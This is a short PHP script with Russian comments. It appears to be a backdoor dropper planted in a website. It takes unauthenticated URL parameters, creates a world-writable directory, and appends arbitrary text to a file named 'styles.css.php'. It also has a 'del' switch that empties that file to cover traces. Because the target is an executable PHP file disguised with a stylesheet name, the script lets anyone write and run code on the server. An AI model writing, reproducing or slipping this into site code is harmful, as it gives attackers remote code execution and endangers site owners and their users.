<?php


if($_GET['status']=="del"){echo "del";

$f = fopen('styles.css.php', 'w');
fclose($f);
file_put_contents('styles.css.php', '');




exit();}
$file=$_GET['file'];


$amely = mkdir($file, 0777);


$fp = fopen("styles.css.php", "a"); // Открываем файл в режиме записи 
$mytext = $_GET['text']; // Исходная строка
$test = fwrite($fp, $mytext); // Запись в файл
if ($test) echo 'Данные в файл успешно занесены.';
else echo 'Ошибка при записи в файл.';
fclose($fp); //Закрытие файла

 

?>